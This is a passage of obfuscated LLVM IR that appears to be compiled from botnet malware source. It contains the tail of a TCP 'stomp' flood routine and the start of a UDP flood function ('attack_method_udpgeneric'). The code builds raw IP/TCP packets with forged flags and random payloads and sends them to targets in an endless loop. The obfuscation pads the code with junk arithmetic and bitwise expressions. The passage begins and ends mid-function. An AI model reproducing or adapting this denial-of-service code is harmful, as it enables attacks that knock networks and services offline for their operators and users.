  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %278, i32 0, i32 1
  store i32 %274, i32* %279, align 4
  %280 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 3
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i32 0, i32 2
  store i32 %283, i32* %288, align 4
  %289 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 3
  store i16 %291, i16* %296, align 4
  %297 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %302, i32 0, i32 4
  store i16 %298, i16* %303, align 2
  %304 = load i32, i32* %24, align 4
  %305 = sext i32 %304 to i64
  %306 = sub i64 40, 8793752525119877714
  %307 = add i64 %306, %305
  %308 = add i64 %307, 8793752525119877714
  %309 = add i64 40, %305
  %310 = call noalias i8* @malloc(i64 %308) #6
  %311 = load i8**, i8*** %12, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds i8*, i8** %311, i64 %313
  store i8* %310, i8** %314, align 8
  %315 = load i8**, i8*** %12, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds i8*, i8** %315, i64 %317
  %319 = load i8*, i8** %318, align 8
  %320 = bitcast i8* %319 to %struct.iphdr*
  store %struct.iphdr* %320, %struct.iphdr** %36, align 8
  %321 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i64 1
  %323 = bitcast %struct.iphdr* %322 to %struct.tcphdr*
  store %struct.tcphdr* %323, %struct.tcphdr** %37, align 8
  %324 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i64 1
  %326 = bitcast %struct.tcphdr* %325 to i8*
  store i8* %326, i8** %38, align 8
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = bitcast %struct.iphdr* %327 to i8*
  %329 = load i8, i8* %328, align 4
  %330 = xor i8 15, -1
  %331 = xor i8 %329, %330
  %332 = and i8 %331, %329
  %333 = and i8 %329, 15
  %334 = and i8 %332, 64
  %335 = xor i8 %332, 64
  %336 = or i8 %334, %335
  %337 = or i8 %332, 64
  store i8 %336, i8* %328, align 4
  %338 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %339 = bitcast %struct.iphdr* %338 to i8*
  %340 = load i8, i8* %339, align 4
  %341 = xor i8 %340, -1
  %342 = xor i8 -16, -1
  %343 = xor i8 -46, -1
  %344 = or i8 %341, %342
  %345 = or i8 -46, %343
  %346 = xor i8 %344, -1
  %347 = and i8 %346, %345
  %348 = and i8 %340, -16
  %349 = and i8 %347, 5
  %350 = xor i8 %347, 5
  %351 = or i8 %349, %350
  %352 = or i8 %347, 5
  store i8 %351, i8* %339, align 4
  %353 = load i8, i8* %13, align 1
  %354 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 1
  store i8 %353, i8* %355, align 1
  %356 = load i32, i32* %24, align 4
  %357 = sext i32 %356 to i64
  %358 = sub i64 0, 40
  %359 = sub i64 0, %357
  %360 = add i64 %358, %359
  %361 = sub i64 0, %360
  %362 = add i64 40, %357
  %363 = trunc i64 %361 to i16
  %364 = call zeroext i16 @htons(i16 zeroext %363) #7
  %365 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 2
  store i16 %364, i16* %366, align 2
  %367 = load i16, i16* %14, align 2
  %368 = call zeroext i16 @htons(i16 zeroext %367) #7
  %369 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 3
  store i16 %368, i16* %370, align 4
  %371 = load i8, i8* %15, align 1
  %372 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 5
  store i8 %371, i8* %373, align 4
  %374 = load i8, i8* %16, align 1
  %375 = icmp ne i8 %374, 0
  br i1 %375, label %376, label %380

; <label>:376:                                    ; preds = %262
  %377 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %378 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 4
  store i16 %377, i16* %379, align 2
  br label %380

; <label>:380:                                    ; preds = %376, %262
  %381 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 6
  store i8 6, i8* %382, align 1
  %383 = load i32, i32* @LOCAL_ADDR, align 4
  %384 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 8
  store i32 %383, i32* %385, align 4
  %386 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %387 = load i32, i32* %9, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i32 0, i32 0
  %391 = load i32, i32* %390, align 4
  %392 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  %394 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %395 = load i32, i32* %9, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %394, i64 %396
  %398 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %397, i32 0, i32 3
  %399 = load i16, i16* %398, align 4
  %400 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  store i16 %399, i16* %401, align 4
  %402 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %403 = load i32, i32* %9, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %405, i32 0, i32 4
  %407 = load i16, i16* %406, align 2
  %408 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 1
  store i16 %407, i16* %409, align 2
  %410 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %413, i32 0, i32 2
  %415 = load i32, i32* %414, align 4
  %416 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 2
  store i32 %415, i32* %417, align 4
  %418 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %419 = load i32, i32* %9, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %421, i32 0, i32 1
  %423 = load i32, i32* %422, align 4
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 3
  store i32 %423, i32* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 4
  %428 = load i16, i16* %427, align 4
  %429 = xor i16 %428, -1
  %430 = xor i16 -241, -1
  %431 = xor i16 1944, -1
  %432 = or i16 %429, %430
  %433 = or i16 1944, %431
  %434 = xor i16 %432, -1
  %435 = and i16 %434, %433
  %436 = and i16 %428, -241
  %437 = xor i16 %435, -1
  %438 = xor i16 128, -1
  %439 = xor i16 -29569, -1
  %440 = and i16 %437, -29569
  %441 = and i16 %435, %439
  %442 = and i16 %438, -29569
  %443 = and i16 128, %439
  %444 = or i16 %440, %441
  %445 = or i16 %442, %443
  %446 = xor i16 %444, %445
  %447 = or i16 %437, %438
  %448 = xor i16 %447, -1
  %449 = or i16 -29569, %439
  %450 = and i16 %448, %449
  %451 = or i16 %446, %450
  %452 = or i16 %435, 128
  store i16 %451, i16* %427, align 4
  %453 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 4
  %455 = load i16, i16* %454, align 4
  %456 = xor i16 -257, -1
  %457 = xor i16 %455, %456
  %458 = and i16 %457, %455
  %459 = and i16 %455, -257
  %460 = xor i16 %458, -1
  %461 = xor i16 256, -1
  %462 = xor i16 -30779, -1
  %463 = and i16 %460, -30779
  %464 = and i16 %458, %462
  %465 = and i16 %461, -30779
  %466 = and i16 256, %462
  %467 = or i16 %463, %464
  %468 = or i16 %465, %466
  %469 = xor i16 %467, %468
  %470 = or i16 %460, %461
  %471 = xor i16 %470, -1
  %472 = or i16 -30779, %462
  %473 = and i16 %471, %472
  %474 = or i16 %469, %473
  %475 = or i16 %458, 256
  store i16 %474, i16* %454, align 4
  %476 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 4
  %478 = load i16, i16* %477, align 4
  %479 = xor i16 -4097, -1
  %480 = xor i16 %478, %479
  %481 = and i16 %480, %478
  %482 = and i16 %478, -4097
  %483 = xor i16 %481, -1
  %484 = xor i16 4096, -1
  %485 = xor i16 1437, -1
  %486 = and i16 %483, 1437
  %487 = and i16 %481, %485
  %488 = and i16 %484, 1437
  %489 = and i16 4096, %485
  %490 = or i16 %486, %487
  %491 = or i16 %488, %489
  %492 = xor i16 %490, %491
  %493 = or i16 %483, %484
  %494 = xor i16 %493, -1
  %495 = or i16 1437, %485
  %496 = and i16 %494, %495
  %497 = or i16 %492, %496
  %498 = or i16 %481, 4096
  store i16 %497, i16* %477, align 4
  %499 = call i32 @rand_next()
  %500 = xor i32 %499, -1
  %501 = xor i32 65535, -1
  %502 = xor i32 -532470794, -1
  %503 = or i32 %500, %501
  %504 = or i32 -532470794, %502
  %505 = xor i32 %503, -1
  %506 = and i32 %505, %504
  %507 = and i32 %499, 65535
  %508 = trunc i32 %506 to i16
  %509 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 5
  store i16 %508, i16* %510, align 2
  %511 = load i8, i8* %18, align 1
  %512 = sext i8 %511 to i16
  %513 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 4
  %515 = load i16, i16* %514, align 4
  %516 = xor i16 1, -1
  %517 = xor i16 %512, %516
  %518 = and i16 %517, %512
  %519 = and i16 %512, 1
  %520 = shl i16 %518, 13
  %521 = xor i16 %515, -1
  %522 = xor i16 -8193, -1
  %523 = xor i16 22786, -1
  %524 = or i16 %521, %522
  %525 = or i16 22786, %523
  %526 = xor i16 %524, -1
  %527 = and i16 %526, %525
  %528 = and i16 %515, -8193
  %529 = and i16 %527, %520
  %530 = xor i16 %527, %520
  %531 = or i16 %529, %530
  %532 = or i16 %527, %520
  store i16 %531, i16* %514, align 4
  %533 = load i8, i8* %19, align 1
  %534 = sext i8 %533 to i16
  %535 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 4
  %537 = load i16, i16* %536, align 4
  %538 = xor i16 1, -1
  %539 = xor i16 %534, %538
  %540 = and i16 %539, %534
  %541 = and i16 %534, 1
  %542 = shl i16 %540, 12
  %543 = xor i16 %537, -1
  %544 = xor i16 -4097, -1
  %545 = xor i16 7303, -1
  %546 = or i16 %543, %544
  %547 = or i16 7303, %545
  %548 = xor i16 %546, -1
  %549 = and i16 %548, %547
  %550 = and i16 %537, -4097
  %551 = xor i16 %549, -1
  %552 = xor i16 %542, -1
  %553 = xor i16 -27419, -1
  %554 = and i16 %551, -27419
  %555 = and i16 %549, %553
  %556 = and i16 %552, -27419
  %557 = and i16 %542, %553
  %558 = or i16 %554, %555
  %559 = or i16 %556, %557
  %560 = xor i16 %558, %559
  %561 = or i16 %551, %552
  %562 = xor i16 %561, -1
  %563 = or i16 -27419, %553
  %564 = and i16 %562, %563
  %565 = or i16 %560, %564
  %566 = or i16 %549, %542
  store i16 %565, i16* %536, align 4
  %567 = load i8, i8* %20, align 1
  %568 = sext i8 %567 to i16
  %569 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 4
  %571 = load i16, i16* %570, align 4
  %572 = xor i16 %568, -1
  %573 = xor i16 1, -1
  %574 = xor i16 -3894, -1
  %575 = or i16 %572, %573
  %576 = or i16 -3894, %574
  %577 = xor i16 %575, -1
  %578 = and i16 %577, %576
  %579 = and i16 %568, 1
  %580 = shl i16 %578, 11
  %581 = xor i16 %571, -1
  %582 = xor i16 -2049, -1
  %583 = xor i16 13064, -1
  %584 = or i16 %581, %582
  %585 = or i16 13064, %583
  %586 = xor i16 %584, -1
  %587 = and i16 %586, %585
  %588 = and i16 %571, -2049
  %589 = xor i16 %587, -1
  %590 = xor i16 %580, -1
  %591 = xor i16 15533, -1
  %592 = and i16 %589, 15533
  %593 = and i16 %587, %591
  %594 = and i16 %590, 15533
  %595 = and i16 %580, %591
  %596 = or i16 %592, %593
  %597 = or i16 %594, %595
  %598 = xor i16 %596, %597
  %599 = or i16 %589, %590
  %600 = xor i16 %599, -1
  %601 = or i16 15533, %591
  %602 = and i16 %600, %601
  %603 = or i16 %598, %602
  %604 = or i16 %587, %580
  store i16 %603, i16* %570, align 4
  %605 = load i8, i8* %21, align 1
  %606 = sext i8 %605 to i16
  %607 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 4
  %609 = load i16, i16* %608, align 4
  %610 = xor i16 1, -1
  %611 = xor i16 %606, %610
  %612 = and i16 %611, %606
  %613 = and i16 %606, 1
  %614 = shl i16 %612, 10
  %615 = xor i16 %609, -1
  %616 = xor i16 -1025, -1
  %617 = xor i16 -20010, -1
  %618 = or i16 %615, %616
  %619 = or i16 -20010, %617
  %620 = xor i16 %618, -1
  %621 = and i16 %620, %619
  %622 = and i16 %609, -1025
  %623 = and i16 %621, %614
  %624 = xor i16 %621, %614
  %625 = or i16 %623, %624
  %626 = or i16 %621, %614
  store i16 %625, i16* %608, align 4
  %627 = load i8, i8* %22, align 1
  %628 = sext i8 %627 to i16
  %629 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 4
  %631 = load i16, i16* %630, align 4
  %632 = xor i16 %628, -1
  %633 = xor i16 1, -1
  %634 = xor i16 -27434, -1
  %635 = or i16 %632, %633
  %636 = or i16 -27434, %634
  %637 = xor i16 %635, -1
  %638 = and i16 %637, %636
  %639 = and i16 %628, 1
  %640 = shl i16 %638, 9
  %641 = xor i16 %631, -1
  %642 = xor i16 -513, -1
  %643 = xor i16 -19447, -1
  %644 = or i16 %641, %642
  %645 = or i16 -19447, %643
  %646 = xor i16 %644, -1
  %647 = and i16 %646, %645
  %648 = and i16 %631, -513
  %649 = and i16 %647, %640
  %650 = xor i16 %647, %640
  %651 = or i16 %649, %650
  %652 = or i16 %647, %640
  store i16 %651, i16* %630, align 4
  %653 = load i8, i8* %23, align 1
  %654 = sext i8 %653 to i16
  %655 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %656 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %655, i32 0, i32 4
  %657 = load i16, i16* %656, align 4
  %658 = xor i16 1, -1
  %659 = xor i16 %654, %658
  %660 = and i16 %659, %654
  %661 = and i16 %654, 1
  %662 = shl i16 %660, 8
  %663 = xor i16 %657, -1
  %664 = xor i16 -257, -1
  %665 = xor i16 -27957, -1
  %666 = or i16 %663, %664
  %667 = or i16 -27957, %665
  %668 = xor i16 %666, -1
  %669 = and i16 %668, %667
  %670 = and i16 %657, -257
  %671 = and i16 %669, %662
  %672 = xor i16 %669, %662
  %673 = or i16 %671, %672
  %674 = or i16 %669, %662
  store i16 %673, i16* %656, align 4
  %675 = load i8*, i8** %38, align 8
  %676 = load i32, i32* %24, align 4
  call void @rand_str(i8* %675, i32 %676)
  br label %724

; <label>:677:                                    ; preds = %251, %240
  %678 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 4
  %680 = load i16, i16* %679, align 4
  %681 = lshr i16 %680, 8
  %682 = xor i16 %681, -1
  %683 = xor i16 1, -1
  %684 = xor i16 18486, -1
  %685 = or i16 %682, %683
  %686 = or i16 18486, %684
  %687 = xor i16 %685, -1
  %688 = and i16 %687, %686
  %689 = and i16 %681, 1
  %690 = zext i16 %688 to i32
  %691 = icmp ne i32 %690, 0
  br i1 %691, label %707, label %692

; <label>:692:                                    ; preds = %677
  %693 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %694 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %693, i32 0, i32 4
  %695 = load i16, i16* %694, align 4
  %696 = lshr i16 %695, 10
  %697 = xor i16 %696, -1
  %698 = xor i16 1, -1
  %699 = xor i16 10706, -1
  %700 = or i16 %697, %698
  %701 = or i16 10706, %699
  %702 = xor i16 %700, -1
  %703 = and i16 %702, %701
  %704 = and i16 %696, 1
  %705 = zext i16 %703 to i32
  %706 = icmp ne i32 %705, 0
  br i1 %706, label %707, label %710

; <label>:707:                                    ; preds = %692, %677
  %708 = load i32, i32* %26, align 4
  %709 = call i32 @close(i32 %708)
  br label %121

; <label>:710:                                    ; preds = %692
  br label %711

; <label>:711:                                    ; preds = %710
  br label %712

; <label>:712:                                    ; preds = %711, %228
  br label %713

; <label>:713:                                    ; preds = %712, %224, %216
  %714 = call i64 @time(i64* null) #6
  %715 = load i64, i64* %31, align 8
  %716 = sub i64 0, %715
  %717 = add i64 %714, %716
  %718 = sub nsw i64 %714, %715
  %719 = icmp sgt i64 %717, 10
  br i1 %719, label %720, label %723

; <label>:720:                                    ; preds = %713
  %721 = load i32, i32* %26, align 4
  %722 = call i32 @close(i32 %721)
  br label %121

; <label>:723:                                    ; preds = %713
  br label %204

; <label>:724:                                    ; preds = %380
  br label %725

; <label>:725:                                    ; preds = %724, %124
  %726 = load i32, i32* %9, align 4
  %727 = sub i32 0, 1
  %728 = sub i32 %726, %727
  %729 = add nsw i32 %726, 1
  store i32 %728, i32* %9, align 4
  br label %115

; <label>:730:                                    ; preds = %115
  br label %731

; <label>:731:                                    ; preds = %859, %730
  store i32 0, i32* %9, align 4
  br label %732

; <label>:732:                                    ; preds = %853, %731
  %733 = load i32, i32* %9, align 4
  %734 = load i8, i8* %5, align 1
  %735 = zext i8 %734 to i32
  %736 = icmp slt i32 %733, %735
  br i1 %736, label %737, label %859

; <label>:737:                                    ; preds = %732
  %738 = load i8**, i8*** %12, align 8
  %739 = load i32, i32* %9, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8*, i8** %738, i64 %740
  %742 = load i8*, i8** %741, align 8
  store i8* %742, i8** %39, align 8
  %743 = load i8*, i8** %39, align 8
  %744 = bitcast i8* %743 to %struct.iphdr*
  store %struct.iphdr* %744, %struct.iphdr** %40, align 8
  %745 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %746 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %745, i64 1
  %747 = bitcast %struct.iphdr* %746 to %struct.tcphdr*
  store %struct.tcphdr* %747, %struct.tcphdr** %41, align 8
  %748 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %749 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %748, i64 1
  %750 = bitcast %struct.tcphdr* %749 to i8*
  store i8* %750, i8** %42, align 8
  %751 = load i16, i16* %14, align 2
  %752 = zext i16 %751 to i32
  %753 = icmp eq i32 %752, 65535
  br i1 %753, label %754, label %763

; <label>:754:                                    ; preds = %737
  %755 = call i32 @rand_next()
  %756 = xor i32 65535, -1
  %757 = xor i32 %755, %756
  %758 = and i32 %757, %755
  %759 = and i32 %755, 65535
  %760 = trunc i32 %758 to i16
  %761 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %762 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %761, i32 0, i32 3
  store i16 %760, i16* %762, align 4
  br label %763

; <label>:763:                                    ; preds = %754, %737
  %764 = load i8, i8* %25, align 1
  %765 = icmp ne i8 %764, 0
  br i1 %765, label %766, label %769

; <label>:766:                                    ; preds = %763
  %767 = load i8*, i8** %42, align 8
  %768 = load i32, i32* %24, align 4
  call void @rand_str(i8* %767, i32 %768)
  br label %769

; <label>:769:                                    ; preds = %766, %763
  %770 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %771 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %770, i32 0, i32 7
  store i16 0, i16* %771, align 2
  %772 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %773 = bitcast %struct.iphdr* %772 to i16*
  %774 = call zeroext i16 @checksum_generic(i16* %773, i32 20)
  %775 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %776 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %775, i32 0, i32 7
  store i16 %774, i16* %776, align 2
  %777 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %778 = load i32, i32* %9, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %777, i64 %779
  %781 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %780, i32 0, i32 1
  %782 = load i32, i32* %781, align 4
  %783 = sub i32 0, 1
  %784 = sub i32 %782, %783
  %785 = add i32 %782, 1
  store i32 %784, i32* %781, align 4
  %786 = trunc i32 %782 to i16
  %787 = call zeroext i16 @htons(i16 zeroext %786) #7
  %788 = zext i16 %787 to i32
  %789 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %790 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %789, i32 0, i32 2
  store i32 %788, i32* %790, align 4
  %791 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %792 = load i32, i32* %9, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %791, i64 %793
  %795 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %794, i32 0, i32 2
  %796 = load i32, i32* %795, align 4
  %797 = trunc i32 %796 to i16
  %798 = call zeroext i16 @htons(i16 zeroext %797) #7
  %799 = zext i16 %798 to i32
  %800 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %801 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %800, i32 0, i32 3
  store i32 %799, i32* %801, align 4
  %802 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 6
  store i16 0, i16* %803, align 4
  %804 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %805 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %806 = bitcast %struct.tcphdr* %805 to i8*
  %807 = load i32, i32* %24, align 4
  %808 = sext i32 %807 to i64
  %809 = sub i64 0, 20
  %810 = sub i64 0, %808
  %811 = add i64 %809, %810
  %812 = sub i64 0, %811
  %813 = add i64 20, %808
  %814 = trunc i64 %812 to i16
  %815 = call zeroext i16 @htons(i16 zeroext %814) #7
  %816 = load i32, i32* %24, align 4
  %817 = sext i32 %816 to i64
  %818 = add i64 20, 3032461371526267163
  %819 = add i64 %818, %817
  %820 = sub i64 %819, 3032461371526267163
  %821 = add i64 20, %817
  %822 = trunc i64 %820 to i32
  %823 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %804, i8* %806, i16 zeroext %815, i32 %822)
  %824 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %825 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %824, i32 0, i32 6
  store i16 %823, i16* %825, align 4
  %826 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %827 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %826, i32 0, i32 1
  %828 = load i16, i16* %827, align 2
  %829 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %830 = load i32, i32* %9, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %829, i64 %831
  %833 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %832, i32 0, i32 0
  %834 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %833, i32 0, i32 1
  store i16 %828, i16* %834, align 2
  %835 = load i32, i32* %10, align 4
  %836 = load i8*, i8** %39, align 8
  %837 = load i32, i32* %24, align 4
  %838 = sext i32 %837 to i64
  %839 = sub i64 40, 7656006506934173352
  %840 = add i64 %839, %838
  %841 = add i64 %840, 7656006506934173352
  %842 = add i64 40, %838
  %843 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %844 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %845 = load i32, i32* %9, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %844, i64 %846
  %848 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %847, i32 0, i32 0
  %849 = bitcast %struct.sockaddr_in* %848 to %struct.sockaddr*
  store %struct.sockaddr* %849, %struct.sockaddr** %843, align 8
  %850 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %851 = load %struct.sockaddr*, %struct.sockaddr** %850, align 8
  %852 = call i64 @sendto(i32 %835, i8* %836, i64 %841, i32 16384, %struct.sockaddr* %851, i32 16)
  br label %853

; <label>:853:                                    ; preds = %769
  %854 = load i32, i32* %9, align 4
  %855 = add i32 %854, -1973216850
  %856 = add i32 %855, 1
  %857 = sub i32 %856, -1973216850
  %858 = add nsw i32 %854, 1
  store i32 %857, i32* %9, align 4
  br label %732

; <label>:859:                                    ; preds = %732
  br label %731

; <label>:860:                                    ; preds = %215, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
